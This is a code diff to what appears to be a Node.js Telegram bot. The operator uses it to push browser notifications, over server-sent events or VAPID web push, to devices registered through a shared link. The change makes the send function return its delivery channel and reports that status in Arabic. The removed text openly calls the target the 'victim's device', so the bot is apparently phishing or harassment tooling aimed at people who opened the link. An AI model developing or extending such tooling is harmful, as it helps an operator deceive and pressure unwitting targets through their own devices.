@@ -777,8 +777,10 @@ bot.on('message', async (msg) => {
     const pText = parts.join(" ").trim();
     if (!pUid || !pText) return bot.sendMessage(chatId, "الاستخدام: /push [uid] [النص]");
     if (!pushSubs[pUid]) return bot.sendMessage(chatId, "❌ هذا الجهاز لم يفعّل الإشعارات بعد.\n\nأرسل /pushlist لمعرفة الأجهزة المسجّلة.");
-    sendPushToDevice(pUid, "🔔 رسالة جديدة", pText);
-    return bot.sendMessage(chatId, `✅ تم إرسال الإشعار — سيظهر فوراً على جهاز الضحية`);
+    const _pr = await sendPushToDevice(pUid, "🔔 رسالة جديدة", pText);
+    if (_pr === "sse")   return bot.sendMessage(chatId, `✅ تم الإرسال — الجهاز متصل الآن، سيظهر الإشعار فوراً`);
+    if (_pr === "vapid") return bot.sendMessage(chatId, `✅ تم الإرسال — سيظهر الإشعار في الخلفية حتى لو الصفحة مغلقة`);
+    return bot.sendMessage(chatId, `📴 الجهاز غير متصل حالياً — سيصل الإشعار عند فتح الرابط مجدداً`);
   }
 
   if (msg.text === "/pushlist") {
@@ -1691,7 +1693,7 @@ async function sendPushToDevice(pid, title, body) {
   if (client) {
     try {
       client.write(`event: push\ndata: ${JSON.stringify({ title, body })}\n\n`);
-      return;
+      return "sse";
     } catch(e) { delete sseClients[pid]; }
   }
   // 2. Fallback to VAPID (background, page closed)
@@ -1699,7 +1701,7 @@ async function sendPushToDevice(pid, title, body) {
   if (entry && entry.subscription) {
     try {
       await webPush.sendNotification(entry.subscription, JSON.stringify({ title, body }));
-      return;
+      return "vapid";
     } catch(e) {
       if (e.statusCode === 410 || e.statusCode === 404) {
         delete entry.subscription;
@@ -1707,11 +1709,7 @@ async function sendPushToDevice(pid, title, body) {
       }
     }
   }
-  // 3. Both failed — notify creator
-  if (entry) {
-    const tid = parseInt(entry.uid, 36);
-    if (tid) notify(tid, `📴 الجهاز غير متصل — سيصل الإشعار عند فتح الرابط مجدداً`);
-  }
+  return null; // Both failed
 }
 
 app.get("/push-poll", (req, res) => res.json({}));
